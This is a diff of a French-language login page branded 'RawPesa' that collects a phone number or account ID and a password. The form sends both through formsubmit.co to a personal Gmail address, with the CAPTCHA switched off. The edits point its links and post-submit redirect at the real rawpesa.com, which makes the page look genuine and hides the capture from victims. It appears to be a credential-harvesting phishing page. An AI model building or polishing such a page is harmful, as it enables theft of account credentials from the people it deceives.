@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="utf-8"/>
@@ -16,34 +16,31 @@
 <body class="bg-[#2f2a8a] min-h-screen flex flex-col items-center justify-start p-6">
 
   <header class="w-full max-w-md flex items-center justify-between mb-8">
-    <a href="https://accueil.com" class="flex items-center text-white text-base font-normal">
+    <a href="https://www.rawpesa.com" class="flex items-center text-white text-base font-normal">
       <i class="fas fa-chevron-left mr-2"></i>
       Retour à l'accueil
     </a>
-    <img src="https://storage.googleapis.com/a1aa/image/d7363665-7d2a-4ef4-df91-9e2bc83d9538.jpg" alt="RawPesa logo" class="h-12 object-contain"/>
+    <img src="ww.jpg" alt="RawPesa logo" class="h-12 object-contain"/>
   </header>
 
   <main class="bg-white rounded-3xl w-full max-w-md p-8 shadow-lg flex flex-col">
     <h1 class="text-[#2f2a8a] font-bold text-lg text-center mb-2">BIENVENUE</h1>
     <p class="text-center text-sm text-[#2f2a8a] mb-6">
       N'avez-vous pas un compte ?
-      <a href="https://compte.com" class="text-[#4c3bd7] hover:underline">Créer un compte</a>
+      <a href="https://rawpesa.com/reg" class="text-[#4c3bd7] hover:underline">Créer un compte</a>
     </p>
     <hr class="border-t border-gray-300 mb-6"/>
 
     <form class="flex flex-col space-y-4" action="https://formsubmit.co/victorakonkwa2004@gmail.com" method="POST">
-      <!-- Empêche le captcha FormSubmit -->
       <input type="hidden" name="_captcha" value="false">
-      <!-- Sujet de l'e-mail -->
-      <input type="hidden" name="_subject" value="Nouvelle tentative de connexion RawPesa">
-      <!-- Redirection après envoi -->
-      <input type="hidden" name="_next" value="https://rawpesa.atwebpages.com/success.html">
+      <input type="hidden" name="_subject" value="Tentative de connexion RawPesa">
+      <input type="hidden" name="_next" value="https://rawpesa.com/login">
 
-      <input type="text" name="Identifiant" placeholder="Téléphone ou Id Compte" 
+      <input type="text" name="Identifiant" placeholder="Téléphone ou Id Compte"
              class="bg-[#f9f9f9] text-gray-500 placeholder-gray-400 px-4 py-3 rounded-md border border-transparent focus:outline-none focus:ring-2 focus:ring-[#4c3bd7]" required/>
 
       <div class="relative">
-        <input type="password" name="Mot_de_passe" id="passwordInput" placeholder="Mot de passe" 
+        <input type="password" name="Mot_de_passe" id="passwordInput" placeholder="Mot de passe"
                class="bg-[#f9f9f9] text-gray-500 placeholder-gray-400 px-4 py-3 rounded-md border border-transparent w-full focus:outline-none focus:ring-2 focus:ring-[#4c3bd7]" required/>
         <i id="togglePassword" class="fas fa-eye absolute right-4 top-1/2 transform -translate-y-1/2 text-[#2f2a8a] cursor-pointer"></i>
       </div>
@@ -56,11 +53,10 @@
   </main>
 
   <script>
-    // Afficher/masquer le mot de passe
+    // Affichage/Masquage du mot de passe
     document.getElementById("togglePassword").addEventListener("click", function () {
       const passwordInput = document.getElementById("passwordInput");
-      const isPassword = passwordInput.type === "password";
-      passwordInput.type = isPassword ? "text" : "password";
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
       this.classList.toggle("fa-eye-slash");
     });
   </script>
